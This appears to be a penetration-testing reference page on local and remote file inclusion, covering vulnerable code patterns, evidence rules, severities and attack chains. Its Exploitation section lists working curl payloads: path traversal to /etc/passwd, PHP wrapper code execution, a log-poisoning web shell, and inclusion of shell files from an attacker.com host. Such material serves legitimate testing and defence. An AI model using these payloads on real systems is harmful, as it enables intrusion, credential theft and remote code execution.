# LFI / RFI — Local & Remote File Inclusion

## What it is

Server-side code uses user-controlled input to construct a file path that
gets included/read/executed. LFI reads local files; RFI loads remote code.

**CWE**: CWE-98 (RFI), CWE-22 (Path Traversal), CWE-73 (File Inclusion)

## Common patterns

- `include($_GET['page'] . '.php')` — classic PHP include
- `render(template_name=request.GET['tpl'])` — template injection via LFI
- `file_get_contents($path)` without path validation
- `require_once("/views/" . $lang . "/header.php")` — locale-based LFI
- Node: `res.sendFile(req.query.file)` without path sanitization
- Python: `open(os.path.join(base, user_input))` with `../` traversal

## Exploitation

### LFI

```bash
# Basic traversal
curl "$TARGET/page?file=../../../../etc/passwd"
curl "$TARGET/page?file=....//....//....//etc/passwd"   # double encoding bypass

# PHP wrappers
curl "$TARGET/page?file=php://filter/convert.base64-encode/resource=index.php"
curl "$TARGET/page?file=php://input" -d '<?php system("id"); ?>'
curl "$TARGET/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg=="

# Null byte (PHP < 5.3.4)
curl "$TARGET/page?file=../../../../etc/passwd%00"

# Log poisoning → RCE
curl -A '<?php system($_GET["cmd"]); ?>' "$TARGET/"
curl "$TARGET/page?file=/var/log/apache2/access.log&cmd=id"
```

### RFI

```bash
# Only works with allow_url_include=On (PHP)
curl "$TARGET/page?file=http://attacker.com/shell.txt"
curl "$TARGET/page?file=ftp://attacker.com/shell.php"
```

## Evidence requirements

- **Demonstrated**: file content returned in response (e.g., `/etc/passwd`
  entries, source code of known file)
- **Inferred**: error messages revealing file paths, but no actual file content
- LFI to RCE via log poisoning: requires both the poisoned log entry AND
  execution proof

## Severity

| Variant | Severity | Condition |
|---|---|---|
| LFI reading sensitive files | High | /etc/passwd, config files, source code |
| LFI with PHP wrappers → RCE | Critical | php://input, data:// execution |
| LFI → log poisoning → RCE | Critical | Writable log + include |
| RFI (remote code execution) | Critical | Always |
| Path traversal (non-sensitive files) | Medium | No sensitive data exposed |
| LFI blocked by extension append | Low | `.php` appended, no null byte |

## Chains

- LFI → credential-file-read → auth-bypass (read DB creds, API keys, `.env`)
- LFI → source-code-read → discover more vulns (hardcoded secrets, SQLi points)
- LFI → log-poisoning → RCE
- LFI → `/proc/self/environ` → RCE (if User-Agent injected)
- RFI → webshell → full compromise
